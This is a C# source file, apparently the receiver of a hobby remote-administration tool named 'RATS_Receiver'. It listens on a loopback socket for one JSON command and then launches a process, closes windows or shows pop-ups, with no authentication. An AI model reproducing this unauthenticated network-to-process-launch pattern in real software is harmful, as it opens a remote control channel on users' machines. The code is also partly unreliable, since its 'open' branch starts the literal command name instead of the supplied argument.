using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.Json.Serialization;
using System.Text.Json;
using System.Text.Json.Nodes;
using System.Runtime.InteropServices;
using System.Threading;

namespace RATS_Receiver
{
    public class Receiver
    {
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption, uint uType);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("User32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int SendMessage(nuint hWnd, uint msg, nuint wParam, nuint lParam);

        static void Main(string[] args)
        {
            byte[] bytes = new byte[8192];
            IPEndPoint ipend = new IPEndPoint(IPAddress.Loopback, 1024);
            try
            {
                using (Socket sc = new Socket(SocketType.Stream, ProtocolType.Tcp))
                {
                    
                    sc.Bind(ipend);
                    sc.Listen();
                    Socket acptsc = sc.Accept();
                    int bytenum = acptsc.Receive(bytes);
                    ArraySegment<byte> toconv = new ArraySegment<byte>(bytes, 0, bytenum);
                    string received = Encoding.UTF8.GetString(toconv);
                    receiv rec = JsonSerializer.Deserialize<receiv>(received);
                    //if (rec.inst == "shutdown")
                    //{
                    //    Process.Start("Shutdown.exe", rec.arg);
                    //}
                    if (rec.inst == "open")
                    {
                        Process.Start(rec.inst);
                    }
                    if (rec.inst == "sendmessage")
                    {
                        if (rec.arg == "current, close")
                        {
                            nint hwnd = GetForegroundWindow();
                            uint hWNd = Convert.ToUInt32(hwnd);
                            SendMessage(hWNd, 0x0112, 0xF060, 0);
                            Console.WriteLine("Done"); //For testing
                        }
                        if (rec.arg == "specific")
                        {
                           nint hwnd =  FindWindow(null, rec.arg2);
                           uint hWNd = Convert.ToUInt32(hwnd);
                           Console.WriteLine(hWNd);
                           SendMessage(hWNd, 0x0112, 0xF060, 0);
                           Console.WriteLine("Done");
                        }
                    }
                    if (rec.inst == "popup")
                    {
                        MessageBox(IntPtr.Zero, rec.arg, rec.arg2, 1);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }

            Console.ReadKey();
        }
    }
}